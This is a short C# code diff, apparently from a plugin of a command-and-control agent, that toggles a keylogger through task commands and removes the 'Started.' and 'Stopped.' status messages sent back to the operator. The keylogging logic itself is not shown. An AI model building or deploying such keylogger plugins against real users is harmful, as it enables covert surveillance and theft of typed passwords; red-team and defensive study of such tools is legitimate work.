@@ -21,13 +21,11 @@ namespace Plugins
             {
                 cts.Cancel();
                 this.isRunning = false;
-                TaskResponseHandler.WriteLine("Stopped.", args["task-id"], true);
             }
             else
             {
                 cts = new CancellationTokenSource();
                 StartKeylogger(args["task-id"]);
-                TaskResponseHandler.WriteLine("Started.", args["task-id"], true);
             }
         }
         public bool StartKeylogger(string task_id)
